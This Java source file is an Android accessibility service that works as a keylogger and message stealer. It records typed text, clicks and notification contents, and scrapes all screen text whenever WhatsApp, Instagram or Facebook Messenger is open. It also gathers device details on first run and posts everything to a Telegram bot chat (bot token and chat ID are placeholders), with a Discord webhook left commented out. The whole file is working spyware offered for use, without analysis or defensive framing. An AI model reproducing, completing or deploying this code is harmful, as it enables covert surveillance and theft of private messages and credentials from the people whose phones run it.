//antigo v3

package com;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;

import org.json.JSONException;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    //private static final String WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL";
    private static final int MAX_BUFFER_SIZE = 25;
    private static final String TAG = "AppUsageAccessibilityService";
    private static final String TARGET_APP_PACKAGE1 = "com.whatsapp.w4b";
    private static final String TARGET_APP_PACKAGE2 = "com.whatsapp";
    private static final String TARGET_APP_PACKAGE3 = "com.instagram.android";
    private static final String TARGET_APP_PACKAGE4 = "com.facebook.orca";
    private static final long EXPIRATION_TIME = 10 * 60 * 1000; // 10 minutes in milliseconds

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private final Map<String, Long> sentTexts = new LinkedHashMap<>();



    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleTypeViewEvent(event);
                break;
            default:
                // Handle other event types if needed
        }
        if (event == null) return;

        // Verifique o tipo de evento
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            // Obtenha o nome do pacote do evento atual
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

            // Verifique se o pacote é o do aplicativo alvo
            if (TARGET_APP_PACKAGE1.equals(packageName) || TARGET_APP_PACKAGE2.equals(packageName) || TARGET_APP_PACKAGE3.equals(packageName) || TARGET_APP_PACKAGE4.equals(packageName)) {
                Log.d(TAG, "Target app open!");
                logAllTexts();
            }
        }
    }


    private void logAllTexts() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            StringBuilder stringBuilder = new StringBuilder();
            traverseNode(rootNode, stringBuilder);
            String allTexts = stringBuilder.toString();
            Log.d(TAG, "Texts displayed on the screen: \n " + allTexts);
            currentKeyEvents.append("Texts displayed on the screen: \n\n");

            long currentTime = System.currentTimeMillis();
            // Remove expired entries
            sentTexts.entrySet().removeIf(entry -> currentTime - entry.getValue() > EXPIRATION_TIME);

            // Append the texts to the buffer if they haven't been sent before
            if (!sentTexts.containsKey(allTexts)) {
                currentKeyEvents.append(allTexts).append("\n");
                sentTexts.put(allTexts, currentTime);

                // Check buffer size and send if it exceeds MAX_BUFFER_SIZE
                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToDiscordAndClear();
                }
            } else {
                // Log a message if the text has already been sent recently
                Log.d(TAG, "Previous text detected. Buffer was not sent.");
                currentKeyEvents.append("Duplicated log avoided.\n");
                sendBufferToDiscordAndClear();
            }
        }
    }

    private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
        if (node == null) return;

        if (node.getText() != null) {
            stringBuilder.append(node.getText().toString()).append("\n\n");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), stringBuilder);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        // Handle text changed events
        List<CharSequence> textList = event.getText();
        StringBuilder buffer = new StringBuilder();
        boolean newTextAdded = false;

        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);

            if (newKeyEventCount > keyEventCount) {
                buffer.append(newText.substring(keyEventCount));
                newTextAdded = true;
            }

            keyEventCount = newKeyEventCount;
        }

        if (newTextAdded) {
            currentKeyEvents.append(buffer);

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            // Extract detailed information from the Notification object
            Notification notification = (Notification) event.getParcelableData();
            if (notification != null) {
                Bundle extras = notification.extras;
                String title = extras.getString(Notification.EXTRA_TITLE, "");
                String text = extras.getString(Notification.EXTRA_TEXT, "");
                String subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");
                String bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "");

                // Append detailed notification text to the buffer along with log message
                currentKeyEvents.append("Notification: ").append(title).append(" - ").append(text)
                        .append(subText.isEmpty() ? "" : " - " + subText)
                        .append(bigText.isEmpty() ? "" : " - " + bigText).append("\n");
            } else {
                currentKeyEvents.append("Notification: ").append(notificationText).append("\n");
            }

            // Check buffer size
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private void handleTypeViewEvent(AccessibilityEvent event) {
        StringBuilder clickedViewTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            clickedViewTextBuilder.append(text);
        }
        CharSequence clickedViewText = clickedViewTextBuilder.toString();

        if (!clickedViewText.toString().isEmpty()) {
            // Append clicked view text to the buffer along with log message
            currentKeyEvents.append("Clicked: ").append(clickedViewText).append("\n");

            // Check buffer size
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private int countKeyEvents(String text) {
        // Count the number of key events (assuming each character is a key event)
        return text.length();
    }

    private void sendBufferToDiscordAndClear() {
        String log = currentKeyEvents.toString();

        // Append MANUFACTURER and MODEL to the log message
        String deviceInfo = "MANUFACTURER: " + Build.MANUFACTURER + "\n";
        deviceInfo += "MODEL: " + Build.MODEL + "\n";

        log = deviceInfo + log;

        new MessageSender().execute(log);
        currentKeyEvents.setLength(0); // Clear the builder
    }


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Gather device details
            String deviceDetails = getSYSInfo();

            // Send the gathered information to Discord
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
                "MODEL : " + Build.MODEL + "\n" +
                "PRODUCT : " + Build.PRODUCT + "\n" +
                "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
                "VERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL + "\n" +
                "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n" +
                "BOARD : " + Build.BOARD + "\n";
    }


    @Override
    public void onInterrupt() {
        //
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];

            try {
                String botNumber = "BOT_NUMBER";
                String secretKey = "SECRET_KEY";
                String botToken = botNumber + ":" + secretKey;
                String chatId = "CHAT_ID";
                String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                // Modify log message to ensure "Notification" line is always on its own line
                log = log.replace("Notification:", "\nNotification:");

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("chat_id", chatId);
                messageJSON.put("text", "```\n" + log + "\n```");
                messageJSON.put("parse_mode", "MarkdownV2");

                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Message sent to Telegram chat.");
                } else {
                    Log.e(TAG, "Failed to send message to Telegram chat. Response code: " + responseCode);
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Failed to create JSON object: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Failed to send message to Telegram chat: " + e.getMessage());
            }
            return null;
        }
    }
}


